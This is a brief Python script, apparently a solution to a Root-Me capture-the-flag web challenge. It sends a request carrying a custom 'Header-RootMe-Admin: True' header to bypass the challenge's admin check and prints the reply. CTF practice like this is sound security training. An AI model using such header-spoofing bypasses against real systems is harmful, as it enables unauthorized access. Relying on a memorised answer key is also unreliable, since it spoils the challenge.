# OK
import requests

url = "http://challenge01.root-me.org/web-serveur/ch5/"

headers = {"Header-RootMe-Admin":"True"}

res = requests.get(url,headers=headers)

print(res.text)

# headers = res.headers

# for header in headers:

#     print(f" {header}       {headers[header]}")